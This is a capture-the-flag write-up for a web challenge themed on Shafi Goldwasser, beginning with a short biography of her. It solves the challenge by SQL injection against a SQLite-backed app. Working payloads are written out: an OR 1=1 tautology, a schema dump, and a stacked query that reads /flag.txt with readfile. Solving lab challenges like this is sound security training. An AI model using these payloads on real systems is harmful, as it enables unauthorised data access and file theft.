# Shafrira Goldwasser

## Shafrira Goldwasser

[Shafrira Goldwasser](https://en.wikipedia.org/wiki/Shafi_Goldwasser)  (Hebrew: שפרירה גולדווסר; born 1959) is an Israeli-American computer scientist and winner of the Turing Award in 2012. She is the RSA Professor of Electrical Engineering and Computer Science at Massachusetts Institute of Technology; a professor of mathematical sciences at the Weizmann Institute of Science, Israel; the director of the Simons Institute for the Theory of Computing at the University of California, Berkeley; and co-founder and chief scientist of Duality Technologies.

## Description

Chal: I asked ChatGPT to make this  [webapp](https://cyberheroines-web-srv4.chals.io/)  but I couldnt prove it was secure. In honor of  [this Turing Award winner](https://www.youtube.com/watch?v=DfJ8W49R0rI), prove it is insecure by returning the flag.

Alternate (Better) Link:  [Webapp](http://ec2-3-144-228-78.us-east-2.compute.amazonaws.com:6264/)

Author:  [TJ](https://www.tjoconnor.org/)

Source: [webapp.zip](https://cyberheroines.ctfd.io/files/53d484fce0d4e7b2e68170dcae1a9a0e/webapp.zip?token=eyJ1c2VyX2lkIjo1ODQsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjIyfQ.ZP4IzA.NPMDoOb-pblLrryOmKCLi8oqrGc "webapp.zip") (Provided later)

## Solution

![Shafrira-Goldwasser-1](/assets/ctf/cyberheroinesctf/shafrira-goldwasser-1.png)

Website let's us choose Cyber Heroine and read their biography. The most probable attack vector seems SQLi, because data comes from somewhere. Quickly testing the classic payload: `' OR 1=1 --`

![Shafrira-Goldwasser-2](/assets/ctf/cyberheroinesctf/shafrira-goldwasser-2.png)

SQLi is confirmed.

Now we need to identify DBMS. Since the application is simple and small it's probably SQLite3.

Trying simple payload: `'; SELECT sql FROM sqlite_schema --` (The query turned out to allow different queries, so no need for UNION)

```sql
CREATE  TABLE "cyberheroines" ("name"  TEXT, "biography"  TEXT) 
```

Hmmm... There's only one table? We already looked at the records previously, so where is the flag?

Looking into [PayloadsAllTheThings: SQLite](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database): "Remote Command Execution using SQLite command - Attach Database". We can potentially gain RCE from SQLi, if we manage to attach new database and execute php code. This route already failed because application runs on Python and not PHP.

![Shafrira-Goldwasser-3](/assets/ctf/cyberheroinesctf/shafrira-goldwasser-3.png)

But we can create a database, insert arbitrary file contents into it, read database for profit.

```sql
';
CREATE TABLE letmein (uwu TEXT);
INSERT INTO letmein VALUES (readfile('/flag.txt'));
SELECT * FROM letmein;
DROP TABLE letmein;
/*
```

1. Escape quote for SQLi
2. Create table
3. Read flag file \[[8.3. File I/O Functions: readfile](https://sqlite.org/cli.html)\]
4. Read from table
5. Discard table (Challenge is ongoing after all)
::: tip Flag
`chctf{CH4ng3d_h0w_w3_th1Nk_of_pr00f$}`
:::

## Note

If challenge is broken you know who to blame <!-- krississy (╯°□°）╯︵ ┻━┻ -->

![broken](/assets/ctf/cyberheroinesctf/shafrira-goldwasser-broken.png)